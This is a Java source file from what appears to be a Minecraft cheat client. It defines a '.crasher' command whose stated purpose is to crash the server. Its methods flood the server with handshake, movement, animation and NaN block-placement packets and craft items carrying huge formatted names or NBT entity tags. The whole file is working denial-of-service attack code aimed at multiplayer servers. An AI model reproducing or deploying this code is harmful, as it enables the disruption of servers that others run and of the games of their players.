package me.aidanmees.trivia.client.commands;

import me.aidanmees.trivia.client.main.trivia;
import me.aidanmees.trivia.client.modules.Exploits.ServerCrasher;
import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.Packet;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;
import net.minecraft.network.login.client.C01PacketEncryptionResponse;
import net.minecraft.network.play.INetHandlerPlayServer;
import net.minecraft.network.play.client.C00PacketKeepAlive;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C02PacketUseEntity;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C0DPacketCloseWindow;
import net.minecraft.network.play.client.C0FPacketConfirmTransaction;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.status.client.C00PacketServerQuery;
import net.minecraft.network.status.client.C01PacketPing;
import net.minecraft.src.MathUtils;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;

public class CommandCrasher extends Command {

	@Override
	public void run(String[] args) {
		if (args.length < 2) {
			trivia.chatMessage("Enter a method. (book, worldguard, lagblock, stand, build)");
			return;
		}
		else if (args[1].equalsIgnoreCase("book")){
			for (int i = 1; i < 250; i++){
				ServerCrasher.Test();
			}
		}
		else if (args[1].equalsIgnoreCase("meme")){
			Packet packet = new C00Handshake();
			/*Packet packet = new C00Handshake(int version, string ip,  int port, EnumConnectionState emurequestedState));*/
		
			for(int i = 0; i < 2000; i++)
				mc.thePlayer.sendQueue.addToSendQueue(packet);
		
		}
		else if (args[1].equalsIgnoreCase("worldguard")){

	        Packet<INetHandlerPlayServer> packet; int numPackets;
	       
	            for (int i = 0; i < 1000; i++) {
	                mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY  + (i * 0.00001), mc.thePlayer.posZ, mc.thePlayer.onGround));
	            }
	        

		}
	    else if (args[1].equals("lagblock")){
			if (mc.thePlayer.getCurrentEquippedItem() != null) {
			
				
				StringBuilder sb = new StringBuilder();
				for (int a = 0; a < Short.MAX_VALUE && (sb.length() < Short.MAX_VALUE); a++) {
					sb.append(generateFormattedString(1));
				}
				
				mc.thePlayer.getCurrentEquippedItem().setStackDisplayName(sb.toString());
				trivia.chatMessage("Item now has " + sb.length() + " formatted characters.");
			} else {
				trivia.chatMessage("Please hold an item.");
			}

			}
		else if (args[1].equalsIgnoreCase("stand")){
			ItemStack stack = mc.thePlayer.getHeldItem();
			
			if(stack != null){
				String all = "";
				for(int i = 0; i < 32767; i++){
					all += "a";
				}

				NBTTagCompound effect = new NBTTagCompound();
				NBTTagList effects = new NBTTagList();
				
				 Minecraft.getMinecraft();effects.appendTag(new NBTTagDouble(mc.thePlayer.posX));
				    Minecraft.getMinecraft();effects.appendTag(new NBTTagDouble(mc.thePlayer.posY));
				    Minecraft.getMinecraft();effects.appendTag(new NBTTagDouble(mc.thePlayer.posZ));
				    effect.setBoolean("Invisible", false);
				    effect.setBoolean("NoGravity", true);
				    effect.setBoolean("CustomNameVisible", true);
				    
				    effect.setTag("Pos", effects);
				    
				    effect.setString("CustomName", "§4§l§k" + all);
				    stack.setTagInfo("EntityTag", effect);
				
				mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
			}

		
		}
		else if (args[1].equalsIgnoreCase("animation")){
			Packet packet = new C0APacketAnimation();
			for(int i = 0; i < 1000; i++)
				mc.thePlayer.sendQueue.addToSendQueue(packet);
			trivia.chatMessage("Sending fist animation!");

		}
		else if (args[1].equalsIgnoreCase("build")){
			Packet packet = new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, Double.NaN, mc.thePlayer.posZ), EnumFacing.UP.getIndex(), mc.thePlayer.getHeldItem(), 0, 0, 0);
			for(int i = 0; i < 1000; i++)
				mc.thePlayer.sendQueue.addToSendQueue(packet);
			trivia.chatMessage("Sending build packets!");
	  } else {
			trivia.chatMessage("Crash mode/method not found! methods: build, book, animation, §7lagblock, stand");
			
	
	}

	
		
	
	}
	public static String generateFormattedString(int length) {
		String[] colors = {	"0", "1", "2", "3",
							"4", "5", "6", "7",
							"8", "9",
							"a", "b", "c", "d",
							"e", "f", "k", "l",
							"m", "n", "o", "r"};

		String[] chars	= { "a", "b", "c", "d",
							"e", "f", "g", "h",
							"i", "j", "k", "l",
							"m", "n", "o", "p",
							"q", "r", "s", "t",
							"u", "w", "y", "z",
							"A", "B", "C", "D",
							"E", "F", "G", "H",
							"I", "J", "K", "L",
							"M", "N", "O", "P",
							"Q", "R", "S", "T",
							"U", "W", "Y", "Z",
							"0", "1", "2", "3",
							"4", "5", "6", "7",
							"8", "9"};
		
		String string = "";
		for (int l = 0; l < length; l++) {
			string +=  "§" + colors[MathUtils.customRandInt(0, colors.length - 1)] + chars[MathUtils.customRandInt(0, colors.length - 1)]; /* more words */
		}
		
		return string;
	}


	@Override
	public String getActivator() {
		return ".crasher";
	}

	@Override
	public String getSyntax() {
		return ".crasher <method>";
	}

	@Override
	public String getDesc() {
		return "Tries to crash the server!";
	}
}
